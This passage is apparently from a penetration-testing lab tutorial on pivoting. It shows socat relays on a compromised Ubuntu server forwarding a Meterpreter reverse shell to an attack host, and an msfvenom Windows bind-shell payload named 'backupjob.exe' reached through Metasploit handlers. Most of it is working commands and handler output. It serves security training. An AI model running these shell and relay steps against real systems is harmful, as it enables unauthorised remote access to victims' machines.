# Socat Redirection with a Reverse Shell

[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start `socat` on the Ubuntu server.


```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Socat will listen on localhost on port `8080` and
forward all the traffic to port `80` on our attack host (10.10.14.18).
Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.

----------

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.
# Socat Redirection with a Bind Shell
 We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target.

```shell-session
$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

```shell-session
jumphost@ubuntu:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```


This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)

```shell-session
msf6 > use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set LPORT 8080
 run
```
